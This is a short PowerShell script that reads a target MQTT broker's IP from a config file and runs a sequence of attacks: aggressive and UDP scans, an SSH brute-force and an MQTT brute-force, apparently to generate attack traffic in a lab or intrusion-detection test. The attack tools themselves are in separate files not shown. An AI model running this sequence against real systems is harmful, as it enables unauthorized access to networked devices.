# RUN ALL ATTACKS ONCE

$ConfigPath = Join-Path $PSScriptRoot "network_config.json"
$NetConfig = Get-Content $ConfigPath | ConvertFrom-Json

Write-Host "Target broker: $($NetConfig.broker_ip)" -ForegroundColor Cyan

# 1) Aggressive Scan
& "$PSScriptRoot\scan_A.bat"
Start-Sleep -Seconds 3

# 2) UDP Scan
& "$PSScriptRoot\scan_sU.bat"
Start-Sleep -Seconds 3

# 3) SSH Bruteforce
& "$PSScriptRoot\ssh_bruteforce_nmap.bat"
Start-Sleep -Seconds 3

# 4) MQTT Bruteforce
& python "$PSScriptRoot\mqtt_bruteforce.py"

Write-Host "All attacks completed." -ForegroundColor Green
Pause
